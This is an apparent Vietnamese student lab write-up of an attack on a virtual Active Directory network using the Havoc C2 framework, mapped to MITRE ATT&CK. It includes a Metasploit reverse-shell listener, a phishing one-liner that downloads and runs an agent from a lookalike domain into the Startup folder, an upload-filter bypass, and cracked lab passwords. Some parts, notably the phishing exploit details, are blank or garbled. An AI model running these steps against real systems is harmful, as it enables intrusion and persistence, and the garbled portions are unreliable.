# **Project ethical hacking**
# **Topic: tấn công mạng**
## **1. Thông tin về project**
Xây dụng mô hình và kịch bản tấn công hệ thống mạng sử dụng mô hình C2 havoc. Mô tả các kỹ thuật tấn công theo MITRE ATT@CK.
- Xây dựng mô hình chung cho hệ thống và xây dựng hoàn chỉnh các thành phần trong mạng như AD, Web, Client...
- Xây dựng mô hình C2, phân tích cụ thể các thành phần sử dụng trong C2.
- Xây dựng các kịch bản tấn công và phân tích các kỹ thuật sử dụng trong đó.

Hệ thống lab được build bằng VMware workstation pro.

## **2. Phân tích quá trình tấn công**
### **2.1 Kịch bản tấn công**
AD: `phongbat.com`

WEb: 'home.phongbat.com'

Hệ thống nội bộ gồm 4 máy:
- `RootDC (Active Directory)`: Window Server 2019
- `User1 (WS1)`: Window 10
- `User2 (WS2)`: Window 10
- `Web (Web01)`: Ubuntu, đóng vai trò là WebServer giao tiếp với External Network

- Máy Attacker sử dụng `Kali Linux` dùng để xâm nhập vào hệ thống nội bộ ở trên.

Giới thiệu về `Havoc Framework`: một framework mã nguồn mở cho phép cài đặt và vận hành C2 server một cách dễ dàng, tích hợp nhiều tính năng giúp cho việc quản lí, duy trì trong hệ thống mạng đã khai thác, được sử dụng như một giải pháp thay thế cho `Cobalt Strike` và `Brute Ratel` (post-exploitation C2 framework). C2 framework cung cấp cho các threat actor khả năng thả beacon trên các mạng bị xâm chiếm để vận chuyển các payload độc hại. Trong những năm qua, `Cobalt Strike` và `Brute Ratel` đã trở thành công cụ phổ biến để các threat actor cung cấp payload độc hại cho những nạn nhân được nhắm tới. Điều này đã khiến các nhà phát triển và tổ chức C2 sử dụng `Cobalt Strike` và `Brute Ratel` phải cảnh giác hơn với phần mềm độc hại tiềm ẩn bên trong repository của họ. Với `Havoc`, các threat actor được cung cấp một lựa chọn mới trong việc nhắm mục tiêu và khai thác hệ thống mạng.

Về hệ thống C2 Server, gồm 3 thành phần chính:
- `Havoc Server`: Máy chủ cốt lõi của framework, dùng để khởi động listener, tương tác với các agent và xử lí các command do client yêu cầu.
- `Havoc Client`: Giao diện chính của framework, giúp cho các thành viên redteam liên lạc, tương tác với các máy bị xâm chiếm.
- `Havoc Agent`: payload được khởi chạy bởi máy tính mục tiêu, nhận lệnh và thực thi lệnh do server yêu cầu.

Attacker có thể xâm nhập vào hệ thống thông qua 2 cách tiếp cận: exploit từ Web01 đi vào, tải và thực thi file agent, sau đó gửi malware phishing cho WS01, từ đó máy WS01 này sẽ tải agent và thực thi để thêm vào C2 Server, duy trì sự hiện diện trong hệ thống.

### **2.2 Phân tích cụ thể**
#### **2.2.1. Reconnaissance (T1595.003 - Active Scanning).**
Truy cập vào trang chủ chính `home.phongbat.com' ta chỉ thấy được các giao diện thông thường, test qua vài lỗ hổng trong OWASP nhưng không có gì bất thường.

Tiến hành scandir xem có thư mục nào ẩn không ta tìm được một vài directory ẩn: `/robots.txt`,`/admin`.

Ta tìm được một trang web cho phép upload ảnh online.

Tấn công upload: Trang upload chỉ cho phép .jpg. Tuy nhiên, bypass bằng cách tải lên shell.php.jpg và chiếm quyền Web Server.

#### **2.2.1. Initial Access .**
*Tìm kiếm thông tin:

Để xác định được hệ thống gồm bao nhiêu máy, ta sẽ tiến hành scan mạng nội bộ. Nhưng do vấn đề phát hiện và ghi log của máy, không sử dụng nmap mà ta sẽ tạo một file bash script có tên là check.sh và ping mạng `12.3.3.0/24`.

Ta tìm được 3 ip sau: `12.3.3.2`, `12.3.3.27` và `12.3.3.99` => hệ thống gồm 4 máy bao gồm web.
Trong quá trình reconnaissance máy web, tìm thấy một file `config` chứa thông tin của user khác ở đường dẫn `/var/www/config`.

*Leo thang đặc quyền:

Ta dùng `su` để chuyển sang user này xem tìm kiếm được thông tin gì không.

Bất ngờ, user này được cấu hình chạy nano với sudo vì vậy ta dễ dàng lấy được quyền root, truy cập thư mục `/root`, ta tìm được credential của ip `12.3.3.10`

#### **2.2.3. Lateral Movement (T1021.001, T1570, T1534)**
*Cắm agent vào client1:
Tiếp theo ta sẽ sử dụng Havoc Framework để cắm agent vào máy `clien1` dễ dàng truy cập và duy trì sự hiện diện.

Chúng ta sẽ tạo một agent tên là teams.exe và gửi nó qua cho máy darlene bằng cách host một server có domain ms-updates.online chứa file này, sau đó kích hoạt để HavocClient hiển thị các thông tin của máy này, bao gồm cả shell, thư mục, đường dẫn, ...

Vậy là ta đã thành công cắm C2 Server vào máy `client1`. Ta cần phải thêm file `teams.exe` này vào startup của máy để khi máy được khởi động, HavocCilent sẽ tự động kết nối. Chúng ta sẽ cd vào đường dẫn sau và tải file agent về, khi đó mục startup của máy sẽ có tiến trình agent này, khi máy khởi động thì tiến trình này sẽ tự động kích hoạt. Path: `C:\Users\clent1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`.

Việc đầu tiên cần làm là kiểm tra máy có mở port 3389 hay không. Và sau khi sử dụng lệnh shell `netstat -aon`, kết quả là máy có mở.
*Dump credentials:
Tiếp theo dump credentials của máy tryell, mục đích của việc này là để kiếm xem có các file password mà các user này để ở đâu đó trong máy không. Tại bước này, ta sẽ sử dụng `Metasploit` để tạo payload có tên là `ms-teams.exe` và lấy được `Meterpreter` của máy client1.

Tiếp theo chạy msfconsole để tạo listener.
```
Msf6> use exploit/multi/handler
Msf6> set payload windows/meterpreter/reverse_tcp
Msf6> set LHOST 172.16.17.20
Msf6> set LPORT 1234
Msf6> exploit
```

Sau đó, vận chuyển payload `ms-teams.exe` vừa tạo thông qua shell của HavocClient.

Sử dụng công cụ hash decryptor online, ta tìm được các account như sau:
```
darlene:WinClient321
dxl:P@ssword
tryell:WinClient123
vagrant:vagrant
```

RDP từng user ta tìm được list email của nhân viên trong document.
Phishing:
Vì tìm được các list email của nhân viên, ta sẽ tiến hành sử dụng kĩ thuật phishing, gửi malware cho các user mà ta thu thập được.

Để có thể phishing thì ta cần chuẩn bị một file malware. Ở đây chúng tôi sẽ sử dụng lỗi của " đang trong quá trình suy nghĩ" cho phép kẻ tấn công thực thi mã từ xa, với định danh `1`. Sử dụng tool tạo  được lấy từ (https://github.com/). Khởi tạo xong file và đặt tên là ``, ta tiến hành gửi file  này cho user 'clent2' thông qua mail.

Script: ``` cd C:\Users\tryell\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup & curl ms-updates.online/teams.exe -o teams.exe & teams.exe ```  

Giả sử user 'client2' đã tải về. Khi user này mở ra và bấm vào file, script sẽ được chạy, cd vào đường dẫn chứa thư mục startup, tải file agent có tên `teams.exe` về máy và tự khởi chạy.

Kiểm tra ip của máy, ta biết được ip là `12.3.3.99`. Vậy máy còn lại có ip `12.3.3.2` chính là AD.

#### **2.2.4. Command and Control (T1071.001, T1570) và Exfiltration (T1041 - Exfiltration Over C2 Channel)**
Tạo backdoor:
Làm tương tự với máy client 1, ta vận chuyển payload và dump credentials của máy.

Vậy ta đã thu thập đủ thông tin của máy AD:
- IP: `12.3.3.2`
- Username: `phongbat\mrrobot`
- Password: `P@ssword`
Ta thử sử dụng credential này bằng rdp.

Sau đó ta sẽ tạo backdoor bằng havoc framework và Tạo Golden Ticket để duy trì quyền truy cập lâu dài.
## **3. Tổng kết**
Bảng MITRE ATT&CK:

|Tên kĩ thuật|ID|Phương thức|
|---|---|---|
|Reconnaissance|T1595.003|Active Scanning – Wordlist Scanning|
|Initial Access|T1659|Content Injection|
||T1078|Valid Account|
|Lateral Movement|T1021.001|Remote Service – Remote Desktop Protocol|
||T1534|Internal Spearphishing|
||T1570|Lateral Tools Transfer|
|Command and Control|T1659|Content Injection|
|Exfiltration|T1041|Exfiltration Over C2 Channel|

Tài liệu tham khảo:

[1] https://github.com/Ashifcoder/exposelab

[2] https://attack.mitre.org/matrices/enterprise/

[3] https://github.com/HavocFramework/Havoc

[4] https://blog.viettelcybersecurity.com/canh-bao-chien-dich-tan-cong-cua-nhom-apt-darkpink-nham-den-vao-nuoc-dong-nam-a/
